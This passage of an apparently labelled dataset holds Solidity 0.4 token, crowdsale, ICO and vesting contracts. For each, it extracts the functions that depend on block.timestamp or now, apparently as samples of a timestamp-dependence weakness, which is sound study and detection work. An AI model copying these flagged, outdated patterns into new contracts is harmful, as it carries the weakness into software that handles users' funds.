_bonusTokens = bonuses[msg.sender];\n if (_bonusTokens > 0) {\n bonuses[msg.sender] = 0;\n require(token.approve(address(timelockController), _bonusTokens));\n require(\n timelockController.createInvestorTokenTimeLock(\n msg.sender,\n _bonusTokens,\n deliveryTime,\n this\n )\n );\n }\n }\n function _processPurchase( address _beneficiary, uint256 _tokenAmount ) internal {\n uint256 _totalTokens = _tokenAmount;\n uint256 _bonus = getBonus(block.timestamp, _beneficiary, msg.value);\n if (_bonus>0) {\n uint256 _bonusTokens = _tokenAmount.mul(_bonus).div(100);\n uint256 _currentBalance = token.balanceOf(this);\n require(_currentBalance >= _totalTokens.add(_bonusTokens));\n bonuses[_beneficiary] = bonuses[_beneficiary].add(_bonusTokens);\n _totalTokens = _totalTokens.add(_bonusTokens);\n }\n tokensToBeDelivered = tokensToBeDelivered.add(_totalTokens);\n super._processPurchase(_beneficiary, _tokenAmount);\n }\n function _preValidatePurchase(address _beneficiary, uint256 _weiAmount) internal whenNotPaused {\n require(authorisedInvestors.whitelist(_beneficiary) || earlyInvestors.whitelist(_beneficiary));\n super._preValidatePurchase(_beneficiary, _weiAmount);\n }\n function getBonus(uint256 _time, address _beneficiary, uint256 _value) view internal returns (uint256 _bonus) {\n _bonus = 0;\n if ( (weiRaised.sub(_value) < goal) && earlyInvestors.whitelist(_beneficiary) ) {\n _bonus = 30;\n } else {\n if (_time < openingTime.add(7 days)) {\n _bonus = 15;\n } else if (_time < openingTime.add(14 days)) {\n _bonus = 10;\n } else if (_time < openingTime.add(21 days)) {\n _bonus = 8;\n } else {\n _bonus = 6;\n }\n }\n return _bonus;\n }\n function finalization() internal {\n if (goalReached()) {\n timelockController.activate();\n uint256 balance = token.balanceOf(this);\n uint256 remainingTokens = balance.sub(tokensToBeDelivered);\n if (remainingTokens>0) {\n BurnableTokenInterface(address(token)).burn(remainingTokens);\n }\n }\n Ownable(address(token)).transferOwnership(owner);\n super.finalization();\n }\n}",
  "extract_feature": [
    "function hasClosed() public view returns (bool) {\nreturn block.timestamp > closingTime;\n}",
    "function withdrawTokens() public {\nrequire(goalReached());\nrequire(block.timestamp > deliveryTime);\nsuper.withdrawTokens();\nuint256 _bonusTokens = bonuses[msg.sender];\nif (_bonusTokens > 0) {\nbonuses[msg.sender] = 0;\nrequire(token.approve(address(timelockController), _bonusTokens));\nrequire(\ntimelockController.createInvestorTokenTimeLock(\nmsg.sender,\n_bonusTokens,\ndeliveryTime,\nthis\n)\n);\n}\n}",
    "function _processPurchase( address _beneficiary, uint256 _tokenAmount ) internal {\nuint256 _totalTokens = _tokenAmount;\nuint256 _bonus = getBonus(block.timestamp, _beneficiary, msg.value);\nif (_bonus>0) {\nuint256 _bonusTokens = _tokenAmount.mul(_bonus).div(100);\nuint256 _currentBalance = token.balanceOf(this);\nrequire(_currentBalance >= _totalTokens.add(_bonusTokens));\nbonuses[_beneficiary] = bonuses[_beneficiary].add(_bonusTokens);\n_totalTokens = _totalTokens.add(_bonusTokens);\n}\ntokensToBeDelivered = tokensToBeDelivered.add(_totalTokens);\nsuper._processPurchase(_beneficiary, _tokenAmount);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f29"
  },
  "filename": "6929.sol",
  "content": "pragma solidity ^0.4.18;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract MigrationAgent {\n function migrateFrom(address _from, uint256 _value);\n}\ncontract ERC20 {\n function totalSupply() constant returns (uint256);\n function balanceOf(address who) constant returns (uint256);\n function transfer(address to, uint256 value);\n function transferFrom(address from, address to, uint256 value);\n function approve(address spender, uint256 value);\n function allowance(address owner, address spender) constant returns (uint256);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract PitEur is Ownable, ERC20 {\n using SafeMath for uint256;\n uint8 private _decimals = 18;\n uint256 private decimalMultiplier = 10**(uint256(_decimals));\n string private _name = \"PIT-EUR\";\n string private _symbol = \"PIT-EUR\";\n uint256 private _totalSupply = 100000000 * decimalMultiplier;\n bool public tradable = true;\n address public multisig;\n function name() constant returns (string) {\n return _name;\n }\n function symbol() constant returns (string) {\n return _symbol;\n }\n function decimals() constant returns (uint8) {\n return _decimals;\n }\n function totalSupply() constant returns (uint256) {\n return _totalSupply;\n }\n mapping(address => uint256) balances;\n mapping(address => mapping (address => uint256)) allowed;\n mapping(address => uint256) releaseTimes;\n address public migrationAgent;\n uint256 public totalMigrated;\n event Migrate(address indexed _from, address indexed _to, uint256 _value);\n function PitEur(address _multisig) {\n require(_multisig != 0x0);\n multisig = _multisig;\n balances[multisig] = _totalSupply;\n }\n modifier canTrade() {\n require(tradable);\n _;\n }\n function transfer(address to, uint256 value) canTrade {\n require(!isLocked(msg.sender));\n require (balances[msg.sender] >= value && value > 0);\n balances[msg.sender] = balances[msg.sender].sub(value);\n balances[to] = balances[to].add(value);\n Transfer(msg.sender, to, value);\n }\n function balanceOf(address who) constant returns (uint256) {\n return balances[who];\n }\n function transferFrom(address from, address to, uint256 value) canTrade {\n require(to != 0x0);\n require(!isLocked(from));\n uint256 _allowance = allowed[from][msg.sender];\n require(value > 0 && _allowance >= value);\n balances[from] = balances[from].sub(value);\n balances[to] = balances[to].add(value);\n allowed[from][msg.sender] = _allowance.sub(value);\n Transfer(from, to, value);\n }\n function approve(address spender, uint256 value) canTrade {\n require((value >= 0) && (allowed[msg.sender][spender] >= 0));\n allowed[msg.sender][spender] = value;\n Approval(msg.sender, spender, value);\n }\n function allowance(address owner, address spender) constant returns (uint256) {\n return allowed[owner][spender];\n }\n function setTradable(bool _newTradableState) onlyOwner public {\n tradable = _newTradableState;\n }\n function timeLock(address spender, uint256 date) public onlyOwner returns (bool) {\n releaseTimes[spender] = date;\n return true;\n }\n function isLocked(address _spender) public view returns (bool) {\n if (releaseTimes[_spender] == 0 || releaseTimes[_spender] <= block.timestamp) {\n return false;\n }\n return true;\n }\n function setMigrationAgent(address _agent) external onlyOwner {\n require(migrationAgent == 0x0 && totalMigrated == 0);\n migrationAgent = _agent;\n }\n function migrate(uint256 value) external {\n require(migrationAgent != 0x0);\n require(value >= 0);\n require(value <= balances[msg.sender]);\n balances[msg.sender] -= value;\n _totalSupply = _totalSupply.sub(value);\n totalMigrated = totalMigrated.add(value);\n MigrationAgent(migrationAgent).migrateFrom(msg.sender, value);\n Migrate(msg.sender, migrationAgent, value);\n }\n}",
  "extract_feature": [
    "function isLocked(address _spender) public view returns (bool) {\nif (releaseTimes[_spender] == 0 || releaseTimes[_spender] <= block.timestamp) {\nreturn false;\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f2a"
  },
  "filename": "7012.sol",
  "content": "pragma solidity ^0.4.13;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n assert(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n assert(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n assert(token.approve(spender, value));\n }\n}\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n function TokenVesting(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}\ncontract VariableRateTokenVesting is TokenVesting {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n uint256[] public cumulativeRates;\n uint256 public interval;\n constructor(\n address _beneficiary,\n uint256 _start,\n uint256[] _cumulativeRates,\n uint256 _interval\n ) public\n TokenVesting(_beneficiary, _start, 0, ~uint256(0), true)\n {\n for (uint256 i = 0; i < _cumulativeRates.length; ++i) {\n require(_cumulativeRates[i] <= 100);\n if (i > 0) {\n require(_cumulativeRates[i] >= _cumulativeRates[i - 1]);\n }\n }\n cumulativeRates = _cumulativeRates;\n interval = _interval;\n owner = 0x0298CF0d5B60a0aD885518adCB4c3fc49b36D347;\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n if (now < start) {\n return 0;\n }\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n uint256 timeSinceStart = now.sub(start);\n uint256 currentPeriod = timeSinceStart.div(interval);\n if (currentPeriod >= cumulativeRates.length) {\n return totalBalance;\n }\n return totalBalance.mul(cumulativeRates[currentPeriod]).div(100);\n }\n}\ncontract BatchReleaser {\n function batchRelease(address[] vestingContracts, ERC20Basic token) external {\n for (uint256 i = 0; i < vestingContracts.length; i++) {\n VariableRateTokenVesting vesting = VariableRateTokenVesting(vestingContracts[i]);\n vesting.release(token);\n }\n }\n}",
  "extract_feature": [
    "function vestedAmount(ERC20Basic token) public view returns (uint256) {\nuint256 currentBalance = token.balanceOf(this);\nuint256 totalBalance = currentBalance.add(released[token]);\nif (block.timestamp < cliff) {\nreturn 0;\n} else if (block.timestamp >= start.add(duration) || revoked[token]) {\nreturn totalBalance;\n} else {\nreturn totalBalance.mul(block.timestamp.sub(start)).div(duration);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f2b"
  },
  "filename": "7044.sol",
  "content": "pragma solidity 0.4.24;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Whitelisted is Ownable {\n bool public whitelistEnabled = true;\n mapping(address => bool) public whitelist;\n event ICOWhitelisted(address indexed addr);\n event ICOBlacklisted(address indexed addr);\n modifier onlyWhitelisted {\n require(!whitelistEnabled || whitelist[msg.sender]);\n _;\n }\n function whitelist(address address_) external onlyOwner {\n whitelist[address_] = true;\n emit ICOWhitelisted(address_);\n }\n function blacklist(address address_) external onlyOwner {\n delete whitelist[address_];\n emit ICOBlacklisted(address_);\n }\n function whitelisted(address address_) public view returns (bool) {\n if (whitelistEnabled) {\n return whitelist[address_];\n } else {\n return true;\n }\n }\n function enableWhitelist() public onlyOwner {\n whitelistEnabled = true;\n }\n function disableWhitelist() public onlyOwner {\n whitelistEnabled = false;\n }\n}\ninterface ERC20Token {\n function balanceOf(address owner_) external returns (uint);\n function allowance(address owner_, address spender_) external returns (uint);\n function transferFrom(address from_, address to_, uint value_) external returns (bool);\n}\ncontract BaseICO is Ownable, Whitelisted {\n enum State {\n Inactive,\n Active,\n Suspended,\n Terminated,\n NotCompleted,\n Completed\n }\n ERC20Token public token;\n State public state;\n uint public startAt;\n uint public endAt;\n uint public lowCapWei;\n uint public hardCapWei;\n uint public lowCapTxWei;\n uint public hardCapTxWei;\n uint public collectedWei;\n uint public tokensSold;\n address public teamWallet;\n event ICOStarted(uint indexed endAt, uint lowCapWei, uint hardCapWei, uint lowCapTxWei, uint hardCapTxWei);\n event ICOResumed(uint indexed endAt, uint lowCapWei, uint hardCapWei, uint lowCapTxWei, uint hardCapTxWei);\n event ICOSuspended();\n event ICOTerminated();\n event ICONotCompleted();\n event ICOCompleted(uint collectedWei);\n event ICOInvestment(address indexed from, uint investedWei, uint tokens, uint8 bonusPct);\n modifier isSuspended() {\n require(state == State.Suspended);\n _;\n }\n modifier isActive() {\n require(state == State.Active);\n _;\n }\n function start(uint endAt_) public onlyOwner {\n require(endAt_ > block.timestamp && state == State.Inactive);\n endAt = endAt_;\n startAt = block.timestamp;\n state = State.Active;\n emit ICOStarted(endAt, lowCapWei, hardCapWei, lowCapTxWei, hardCapTxWei);\n }\n function suspend() public onlyOwner isActive {\n state = State.Suspended;\n emit ICOSuspended();\n }\n function terminate() public onlyOwner {\n require(state != State.Terminated &&\n state != State.NotCompleted &&\n state != State.Completed);\n state = State.Terminated;\n emit ICOTerminated();\n }\n function tune(uint endAt_,\n uint lowCapWei_,\n uint hardCapWei_,\n uint lowCapTxWei_,\n uint hardCapTxWei_) public onlyOwner isSuspended {\n if (endAt_ > block.timestamp) {\n endAt = endAt_;\n }\n if (lowCapWei_ > 0) {\n lowCapWei = lowCapWei_;\n }\n if (hardCapWei_ > 0) {\n hardCapWei = hardCapWei_;\n }\n if (lowCapTxWei_ > 0) {\n lowCapTxWei = lowCapTxWei_;\n }\n if (hardCapTxWei_ > 0) {\n hardCapTxWei = hardCapTxWei_;\n }\n require(lowCapWei <= hardCapWei && lowCapTxWei <= hardCapTxWei);\n touch();\n }\n function resume() public onlyOwner isSuspended {\n state = State.Active;\n emit ICOResumed(endAt, lowCapWei, hardCapWei, lowCapTxWei, hardCapTxWei);\n touch();\n }\n function touch() public;\n function buyTokens() public payable;\n function forwardFunds() internal {\n teamWallet.transfer(msg.value);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract IonChainICO is BaseICO {\n using SafeMath for uint;\n uint internal constant ONE_TOKEN = 1e6;\n uint public constant ETH_TOKEN_EXCHANGE_RATIO = 125000;\n address public tokenHolder;\n uint public constant PERSONAL_CAP = 1.6 ether;\n uint public personalCapEndAt;\n mapping(address => uint) internal personalPurchases;\n constructor(address icoToken_,\n address teamWallet_,\n address tokenHolder_,\n uint lowCapWei_,\n uint hardCapWei_,\n uint lowCapTxWei_,\n uint hardCapTxWei_) public {\n require(icoToken_ != address(0) && teamWallet_ != address(0));\n token = ERC20Token(icoToken_);\n teamWallet = teamWallet_;\n tokenHolder = tokenHolder_;\n state = State.Inactive;\n lowCapWei = lowCapWei_;\n hardCapWei = hardCapWei_;\n lowCapTxWei = lowCapTxWei_;\n hardCapTxWei = hardCapTxWei_;\n }\n function() external payable {\n buyTokens();\n }\n function start(uint endAt_) onlyOwner public {\n uint requireTokens = hardCapWei.mul(ETH_TOKEN_EXCHANGE_RATIO).mul(ONE_TOKEN).div(1 ether);\n require(token.balanceOf(tokenHolder) >= requireTokens\n && token.allowance(tokenHolder, address(this)) >= requireTokens);\n personalCapEndAt = block.timestamp + 48 hours;\n super.start(endAt_);\n }\n function touch() public {\n if (state != State.Active && state != State.Suspended) {\n return;\n }\n if (collectedWei >= hardCapWei) {\n state = State.Completed;\n endAt = block.timestamp;\n emit ICOCompleted(collectedWei);\n } else if (block.timestamp >= endAt) {\n if (collectedWei < lowCapWei) {\n state = State.NotCompleted;\n emit ICONotCompleted();\n } else {\n state = State.Completed;\n emit ICOCompleted(collectedWei);\n }\n }\n }\n function buyTokens() public onlyWhitelisted payable {\n require(state == State.Active &&\n block.timestamp <= endAt &&\n msg.value >= lowCapTxWei &&\n msg.value <= hardCapTxWei &&\n collectedWei + msg.value <= hardCapWei);\n uint amountWei = msg.value;\n if (block.timestamp <= personalCapEndAt) {\n personalPurchases[msg.sender] = personalPurchases[msg.sender].add(amountWei);\n require(personalPurchases[msg.sender] <= PERSONAL_CAP);\n }\n uint itokens = amountWei.mul(ETH_TOKEN_EXCHANGE_RATIO).mul(ONE_TOKEN).div(1 ether);\n collectedWei = collectedWei.add(amountWei);\n emit ICOInvestment(msg.sender, amountWei, itokens, 0);\n token.transferFrom(tokenHolder, msg.sender, itokens);\n forwardFunds();\n touch();\n }\n}",
  "extract_feature": [
    "function start(uint endAt_) public onlyOwner {\nrequire(endAt_ > block.timestamp && state == State.Inactive);\nendAt = endAt_;\nstartAt = block.timestamp;\nstate = State.Active;\nemit ICOStarted(endAt, lowCapWei, hardCapWei, lowCapTxWei, hardCapTxWei);\n}",
    "function start(uint endAt_) onlyOwner public {\nuint requireTokens = hardCapWei.mul(ETH_TOKEN_EXCHANGE_RATIO).mul(ONE_TOKEN).div(1 ether);\nrequire(token.balanceOf(tokenHolder) >= requireTokens\n&& token.allowance(tokenHolder, address(this)) >= requireTokens);\npersonalCapEndAt = block.timestamp + 48 hours;\nsuper.start(endAt_);\n}",
    "function touch() public {\nif (state != State.Active && state != State.Suspended) {\nreturn;\n}\nif (collectedWei >= hardCapWei) {\nstate = State.Completed;\nendAt = block.timestamp;\nemit ICOCompleted(collectedWei);\n} else if (block.timestamp >= endAt) {\nif (collectedWei < lowCapWei) {\nstate = State.NotCompleted;\nemit ICONotCompleted();\n} else {\nstate = State.Completed;\nemit ICOCompleted(collectedWei);\n}\n}\n}",
    "function buyTokens() public onlyWhitelisted payable {\nrequire(state == State.Active &&\nblock.timestamp <= endAt &&\nmsg.value >= lowCapTxWei &&\nmsg.value <= hardCapTxWei &&\ncollectedWei + msg.value <= hardCapWei);\nuint amountWei = msg.value;\nif (block.timestamp <= personalCapEndAt) {\npersonalPurchases[msg.sender] = personalPurchases[msg.sender].add(amountWei);\nrequire(personalPurchases[msg.sender] <= PERSONAL_CAP);\n}\nuint itokens = amountWei.mul(ETH_TOKEN_EXCHANGE_RATIO).mul(ONE_TOKEN).div(1 ether);\ncollectedWei = collectedWei.add(amountWei);\nemit ICOInvestment(msg.sender, amountWei, itokens, 0);\ntoken.transferFrom(tokenHolder, msg.sender, itokens);\nforwardFunds();\ntouch();\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f2c"
  },
  "filename": "7046.sol",
  "content": "pragma solidity 0.4.24;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier hasMintPermission() {\n require(msg.sender == owner);\n _;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n hasMintPermission\n canMint\n public\n returns (bool)\n {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\ncontract CappedToken is MintableToken {\n uint256 public cap;\n constructor(uint256 _cap) public {\n require(_cap > 0);\n cap = _cap;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n onlyOwner\n canMint\n public\n returns (bool)\n {\n require(totalSupply_.add(_amount) <= cap);\n return super.mint(_to, _amount);\n }\n}\ncontract GambioToken is CappedToken {\n using SafeMath for uint256;\n string public name = \"GMB\";\n string public symbol = \"GMB\";\n uint8 public decimals = 18;\n event Burn(address indexed burner, uint256 value);\n event BurnTransferred(address indexed previousBurner, address indexed newBurner);\n address burnerRole;\n modifier onlyBurner() {\n require(msg.sender == burnerRole);\n _;\n }\n constructor(address _burner, uint256 _cap) public CappedToken(_cap) {\n burnerRole = _burner;\n }\n function transferBurnRole(address newBurner) public onlyBurner {\n require(newBurner != address(0));\n emit BurnTransferred(burnerRole, newBurner);\n burnerRole = newBurner;\n }\n function burn(uint256 _value) public onlyBurner {\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(msg.sender, _value);\n emit Transfer(msg.sender, address(0), _value);\n }\n}\ncontract Crowdsale {\n using SafeMath for uint256;\n GambioToken public token;\n uint256 public startTime;\n uint256 public endTime;\n uint256 public rate;\n address public wallet;\n uint256 public weiRaised;\n event TokenPurchase(address indexed beneficiary, uint256 indexed value, uint256 indexed amount, uint256 transactionId);\n constructor(\n uint256 _startTime,\n uint256 _endTime,\n uint256 _rate,\n address _wallet,\n uint256 _initialWeiRaised,\n uint256 _tokenCap) public {\n require(_startTime >= now);\n require(_endTime >= _startTime);\n require(_wallet != address(0));\n require(_rate > 0);\n require(_tokenCap > 0);\n token = new GambioToken(_wallet, _tokenCap);\n startTime = _startTime;\n endTime = _endTime;\n rate = _rate;\n wallet = _wallet;\n weiRaised = _initialWeiRaised;\n }\n function hasEnded() public view returns (bool) {\n return now > endTime;\n }\n}\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\npragma solidity ^0.4.23;\ncontract TokenVesting is Ownable {\n using SafeMath for uint256;\n using SafeERC20 for ERC20Basic;\n event Released(uint256 amount);\n event Revoked();\n address public beneficiary;\n uint256 public cliff;\n uint256 public start;\n uint256 public duration;\n bool public revocable;\n mapping (address => uint256) public released;\n mapping (address => bool) public revoked;\n constructor(\n address _beneficiary,\n uint256 _start,\n uint256 _cliff,\n uint256 _duration,\n bool _revocable\n )\n public\n {\n require(_beneficiary != address(0));\n require(_cliff <= _duration);\n beneficiary = _beneficiary;\n revocable = _revocable;\n duration = _duration;\n cliff = _start.add(_cliff);\n start = _start;\n }\n function release(ERC20Basic token) public {\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n emit Released(unreleased);\n }\n function revoke(ERC20Basic token) public onlyOwner {\n require(revocable);\n require(!revoked[token]);\n uint256 balance = token.balanceOf(this);\n uint256 unreleased = releasableAmount(token);\n uint256 refund = balance.sub(unreleased);\n revoked[token] = true;\n token.safeTransfer(owner, refund);\n emit Revoked();\n }\n function releasableAmount(ERC20Basic token) public view returns (uint256) {\n return vestedAmount(token).sub(released[token]);\n }\n function vestedAmount(ERC20Basic token) public view returns (uint256) {\n uint256 currentBalance = token.balanceOf(this);\n uint256 totalBalance = currentBalance.add(released[token]);\n if (block.timestamp < cliff) {\n return 0;\n } else if (block.timestamp >= start.add(duration) || revoked[token]) {\n return totalBalance;\n } else {\n return totalBalance.mul(block.timestamp.sub(start)).div(duration);\n }\n }\n}\ncontract GambioVesting is TokenVesting {\n using SafeMath for uint256;\n uint256 public previousRelease;\n uint256 period;\n constructor(uint256 _period, address _beneficiary, uint256 _start, uint256 _cliff, uint256 _duration, bool _revocable)\n public\n TokenVesting(_beneficiary, _start, _cliff, _duration, _revocable) {\n period = _period;\n previousRelease = now;\n }\n function release(ERC20Basic token) public {\n require(now >= previousRelease.add(period));\n uint256 unreleased = releasableAmount(token);\n require(unreleased > 0);\n released[token] = released[token].add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n previousRelease = now;\n emit Released(unreleased);\n }\n}\ncontract CappedCrowdsale is Crowdsale, Ownable {\n using SafeMath for uint256;\n uint256 public hardCap;\n bool public isFinalized = false;\n 